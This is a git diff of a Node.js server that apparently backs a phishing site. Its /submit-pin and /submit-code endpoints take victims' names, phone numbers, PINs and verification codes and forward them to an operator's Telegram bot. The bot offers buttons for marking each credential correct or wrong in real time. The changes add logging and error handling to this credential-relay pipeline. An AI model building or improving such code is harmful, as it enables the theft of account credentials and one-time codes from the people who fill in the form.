@@ -49,30 +49,32 @@ function getBot(botId) {
 
 // ---------------- TELEGRAM HELPERS ----------------
 async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
+    if (!bot) return console.error('❌ Bot not found for sending message');
     try {
-        await axios.post(
+        console.log('📨 Sending Telegram message:', { chat_id: bot.chatId, text, inlineKeyboard });
+        const res = await axios.post(
             `https://api.telegram.org/bot${bot.botToken}/sendMessage`,
             {
                 chat_id: bot.chatId,
                 text,
-                reply_markup: inlineKeyboard.length
-                    ? { inline_keyboard: inlineKeyboard }
-                    : undefined
+                reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
             }
         );
+        console.log('✅ Telegram response:', res.data);
     } catch (err) {
-        console.error(err.response?.data || err.message);
+        console.error('❌ Telegram error:', err.response?.data || err.message);
     }
 }
 
 async function answerCallback(bot, callbackId) {
+    if (!bot) return console.error('❌ Bot not found for answering callback');
     try {
         await axios.post(
             `https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`,
             { callback_query_id: callbackId }
         );
     } catch (err) {
-        console.error(err.response?.data || err.message);
+        console.error('❌ Telegram callback error:', err.response?.data || err.message);
     }
 }
 
@@ -119,7 +121,7 @@ app.get('/success', (req, res) =>
 );
 
 // ---------------- PIN HANDLING ----------------
-app.post('/submit-pin', (req, res) => {
+app.post('/submit-pin', async (req, res) => {
     const { name, phone, pin, botId } = req.body;
     const bot = getBot(botId);
     if (!bot) return res.status(400).json({ error: 'Invalid bot' });
@@ -128,15 +130,20 @@ app.post('/submit-pin', (req, res) => {
     approvedPins[requestId] = null;
     requestBotMap[requestId] = botId;
 
-    sendTelegramMessage(
-        bot,
-        `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`,
-        [[
-            { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
-            { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
-            { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
-        ]]
-    );
+    try {
+        await sendTelegramMessage(
+            bot,
+            `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`,
+            [[
+                { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
+                { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
+                { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
+            ]]
+        );
+        console.log(`✔️ PIN request sent to Telegram for requestId ${requestId}`);
+    } catch (err) {
+        console.error('❌ Failed to send PIN message:', err);
+    }
 
     res.json({ requestId });
 });
@@ -156,7 +163,7 @@ app.get('/check-pin/:requestId', (req, res) => {
 });
 
 // ---------------- CODE HANDLING ----------------
-app.post('/submit-code', (req, res) => {
+app.post('/submit-code', async (req, res) => {
     const { name, phone, code, botId } = req.body;
     const bot = getBot(botId);
     if (!bot) return res.status(400).json({ error: 'Invalid bot' });
@@ -165,15 +172,20 @@ app.post('/submit-code', (req, res) => {
     approvedCodes[requestId] = null;
     requestBotMap[requestId] = botId;
 
-    sendTelegramMessage(
-        bot,
-        `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
-        [[
-            { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
-            { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` },
-            { text: '✅ Code OK + ❌ PIN Wrong', callback_data: `code_pin:${requestId}` }
-        ]]
-    );
+    try {
+        await sendTelegramMessage(
+            bot,
+            `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
+            [[
+                { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
+                { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` },
+                { text: '✅ Code OK + ❌ PIN Wrong', callback_data: `code_pin:${requestId}` }
+            ]]
+        );
+        console.log(`✔️ CODE request sent to Telegram for requestId ${requestId}`);
+    } catch (err) {
+        console.error('❌ Failed to send CODE message:', err);
+    }
 
     res.json({ requestId });
 });
@@ -219,7 +231,11 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     }
 
     if (feedback) {
-        await sendTelegramMessage(bot, `📝 Feedback:\n${feedback}`);
+        try {
+            await sendTelegramMessage(bot, `📝 Feedback:\n${feedback}`);
+        } catch (err) {
+            console.error('❌ Failed to send feedback message:', err);
+        }
     }
 
     await answerCallback(bot, cb.id);
